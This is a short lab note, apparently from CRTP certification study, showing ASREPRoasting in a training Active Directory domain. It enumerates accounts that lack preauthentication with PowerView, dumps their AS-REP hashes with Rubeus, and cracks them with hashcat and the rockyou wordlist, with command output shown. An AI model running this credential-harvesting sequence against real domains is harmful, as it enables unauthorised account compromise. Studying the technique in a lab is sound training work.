#### Theory can be found in [[2. Domain Privilege Escalation#1. ASREPRoast]] ####

- Enumerate for ASREPRoastable accounts using `PowerView.ps1`
```
PS C:\AD\MyTools> Get-DomainUser -PreauthNotRequired | Select-Object -Property samaccountname

samaccountname
--------------
VPN301user
VPN302user
VPN303user
VPN304user
VPN305user
VPN306user
VPN307user
VPN308user
VPN309user
VPN310user
VPN311user
VPN312user
VPN313user
VPN314user
VPN315user
VPN316user
VPN317user
VPN318user
VPN319user
VPN320user
```

- Abuse using `Rubeus.exe`
```
PS C:\AD\MyTools> .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
```

- Crack the hashes.
```
â”Œâ”€â”€(rootðŸ’€0xDe4dBe3f)-[/home/â€¦/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
â””â”€# hashcat -O -a 0 -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt       
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 2167/4398 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

INFO: All hashes found as potfile and/or empty entries! Use --show to display them.

Started: Sun Aug  6 19:47:23 2023
Stopped: Sun Aug  6 19:47:23 2023
```